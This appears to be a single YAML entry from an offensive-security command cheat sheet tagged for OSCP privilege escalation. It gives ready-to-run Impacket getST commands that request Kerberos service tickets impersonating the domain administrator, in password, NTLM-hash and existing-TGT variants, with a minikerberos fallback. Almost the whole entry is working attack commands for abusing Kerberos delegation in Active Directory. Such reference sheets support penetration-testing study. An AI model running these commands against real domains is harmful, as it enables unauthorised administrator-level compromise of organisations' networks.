---
variants:
  - label: creds
    command: |
      impacket-getST -dc-ip $IP -spn $SPN -impersonate administrator $DOMAIN/$USER:$PASSWORD
  - label: hash
    command: |
      impacket-getST -dc-ip $IP -spn $SPN -impersonate administrator $DOMAIN/$USER -hashes :$HASH
  - label: ticket
    command: |
      # mint a service ticket from an existing TGT ccache (you already hold a TGT)
      getST.py --ccache tgt.ccache --kirbi cifs.kirbi -spn cifs/$DC
      # fallback via the minikerberos copy if the above misbehaves
      python3 /usr/lib/python3/dist-packages/minikerberos/examples/getST.py --ccache tgt.ccache --kirbi cifs.kirbi -spn cifs/$DC
description: Request a service ticket impersonating administrator (delegation) or from a ccache, by auth method.
os: [Linux]
category: [oscp, cli]
have: [hash, ticket]
service: [Kerberos]
phase: [PrivEsc]
references:
  - https://github.com/fortra/impacket
---
